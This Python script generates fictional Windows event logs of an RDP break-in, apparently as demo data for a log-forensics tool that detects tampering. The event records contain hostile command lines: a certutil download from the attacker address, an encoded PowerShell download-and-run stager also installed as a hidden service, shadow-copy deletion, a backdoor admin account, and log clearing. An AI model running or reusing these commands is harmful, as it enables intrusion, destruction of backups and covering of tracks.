"""A fictional intrusion, written as real .evtx files (they open in Event Viewer).

RDP brute force from a TEST-NET address -> successful logon -> tool download -> backdoor account
promoted to Administrators -> hidden service -> encoded PowerShell stager -> shadow copies deleted ->
PowerShell log cleared. Then the cover-up: one record deleted outright (a gap in the record ids) and
two records hidden eventlogedit-style inside their neighbours, so Windows no longer shows them.
Benign activity is mixed in so the demo also shows what the tool does *not* flag.
"""

from __future__ import annotations

import base64
from datetime import datetime, timedelta, timezone
from pathlib import Path

from evtxwriter import Ev, write_evtx

START = datetime(2026, 10, 30, 21, 0, 0, tzinfo=timezone.utc)
HOST = "WS01.corp.example"
ATTACKER = "203.0.113.50"
DOMAIN_SID = "S-1-5-21-1004336348-1177238915-682003330"
PS = "Microsoft-Windows-PowerShell"


def _enc(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode()


def build_story(out_dir) -> list[Path]:
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    at = lambda seconds: START + timedelta(seconds=seconds)  # noqa: E731
    sec, rid = [], [100]

    def security(seconds, event_id, data, sid=None):
        rid[0] += 1
        sec.append(Ev(rid[0], at(seconds), event_id, computer=HOST, data=data, user_sid=sid))

    def process(seconds, command, image, user="administrator"):
        security(seconds, 4688, {"SubjectUserName": user, "NewProcessName": image, "CommandLine": command,
                                 "ParentProcessName": "C:\\Windows\\System32\\cmd.exe"})

    # normal morning
    for i, user in enumerate(("alice", "bob", "alice")):
        security(i * 40, 4624, {"TargetUserName": user, "TargetDomainName": "CORP", "LogonType": "2",
                                "IpAddress": "-", "LogonProcessName": "User32"})
    process(130, "\"C:\\Windows\\system32\\notepad.exe\" C:\\Users\\alice\\notes.txt",
            "C:\\Windows\\System32\\notepad.exe", "alice")

    # 21:02 - RDP brute force, then a hit
    for i in range(37):
        security(120 + i * 6, 4625, {"TargetUserName": "administrator", "TargetDomainName": "WS01",
                                     "IpAddress": ATTACKER, "LogonType": "10", "Status": "0xc000006d",
                                     "SubStatus": "0xc000006a", "WorkstationName": "kali"})
    security(351, 4624, {"TargetUserName": "administrator", "TargetDomainName": "WS01", "LogonType": "10",
                         "IpAddress": ATTACKER, "LogonProcessName": "User32"})

    # hands on keyboard
    process(432, "whoami /all", "C:\\Windows\\System32\\whoami.exe")
    deleted = rid[0]                                             # cover-up 1: deleted outright
    process(510, f"certutil.exe -urlcache -split -f http://{ATTACKER}/t.exe C:\\Users\\Public\\t.exe",
            "C:\\Windows\\System32\\certutil.exe")
    hidden = [rid[0]]                                            # cover-up 2: hidden in a neighbour
    security(545, 4720, {"TargetUserName": "support", "TargetDomainName": "WS01",
                         "TargetSid": f"{DOMAIN_SID}-1107", "SubjectUserName": "administrator"})
    security(580, 4732, {"MemberName": "-", "MemberSid": f"{DOMAIN_SID}-1107", "TargetUserName": "Administrators",
                         "TargetSid": "S-1-5-32-544", "SubjectUserName": "administrator"})
    stager = f"IEX (New-Object Net.WebClient).DownloadString('http://{ATTACKER}/stage2.ps1')"
    process(750, f"powershell.exe -NoP -W Hidden -enc {_enc(stager)}",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
    process(900, "vssadmin.exe delete shadows /all /quiet", "C:\\Windows\\System32\\vssadmin.exe")
    hidden.append(rid[0])
    sec = [e for e in sec if e.record_id != deleted]

    system = [
        Ev(5001, at(20), 7045, provider="Service Control Manager", channel="System", computer=HOST,
           data={"ServiceName": "Intel(R) Graphics", "ImagePath": "\\SystemRoot\\System32\\drivers\\igdkmd64.sys",
                 "ServiceType": "kernel mode driver", "StartType": "demand start", "AccountName": ""}),
        Ev(5002, at(662), 7045, provider="Service Control Manager", channel="System", computer=HOST,
           data={"ServiceName": "WinSysUpd",
                 "ImagePath": f"%COMSPEC% /c powershell -nop -w hidden -enc {_enc(stager)}",
                 "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"}),
        Ev(5003, at(980), 104, provider="Microsoft-Windows-Eventlog", channel="System", computer=HOST,
           data={"SubjectUserName": "administrator", "SubjectDomainName": "WS01", "Channel": "Windows PowerShell",
                 "BackupPath": ""}),
    ]
    powershell = [
        Ev(9001, at(760), 4104, provider=PS, channel="Microsoft-Windows-PowerShell/Operational", computer=HOST,
           data={"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": stager,
                 "ScriptBlockId": "6f1e3c1a-2d4b-4a51-9f2e-0c7d8e9a1b2c", "Path": ""}),
        Ev(9002, at(770), 4104, provider=PS, channel="Microsoft-Windows-PowerShell/Operational", computer=HOST,
           data={"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": "Get-ChildItem C:\\Users -Recurse",
                 "ScriptBlockId": "0b1c2d3e-4f50-6172-8394-a5b6c7d8e9f0", "Path": ""}),
    ]
    paths = []
    for name, events, hide in (("Security.evtx", sec, hidden), ("System.evtx", system, ()),
                               ("PowerShell-Operational.evtx", powershell, ())):
        path = out / name
        write_evtx(path, events, hide=hide)
        paths.append(path)
    return paths
